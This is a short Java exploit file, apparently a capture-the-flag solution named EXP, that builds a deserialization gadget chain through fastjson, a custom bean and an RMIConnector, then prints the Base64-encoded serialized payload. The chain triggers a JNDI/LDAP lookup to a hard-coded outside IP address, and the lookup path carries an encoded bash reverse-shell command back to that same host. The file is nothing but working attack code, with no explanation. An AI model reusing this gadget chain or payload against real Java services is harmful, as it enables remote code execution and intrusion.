package com.ctf.ezser;

import com.alibaba.fastjson.JSONObject;
import com.ctf.ezser.bean.MyBean;

import javax.management.BadAttributeValueExpException;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;

public class EXP {
    public static void main(String[] args) throws Exception{
        JMXServiceURL jmxServiceURL = new JMXServiceURL
                ("service:jmx:rmi:///jndi/ldap://124.222.21.138:1389/a");
        setFieldValue(jmxServiceURL, "protocol", "rmi");
        setFieldValue(jmxServiceURL, "port", 0);
        setFieldValue(jmxServiceURL, "host","");
        setFieldValue(jmxServiceURL,"urlPath","/jndi/ldap://124.222.21.138:1389/TomcatBypass/Command/" +
                "Base64/YYmFzaCAtaSA%2bJi9kZXYvdGNwLzEyNC4yMjIuMjEuMTM4LzEzMzcgMD4mMQ==");
                JMXConnector jmxConnector = new RMIConnector(jmxServiceURL,null);
// jmxConnector.connect();
        MyBean myBean = new MyBean();
        setFieldValue(myBean,"conn",jmxConnector);
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("jb", myBean);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);
        setFieldValue(badAttributeValueExpException, "val", jsonObject);
        serialize(badAttributeValueExpException);
    }
    public static void serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
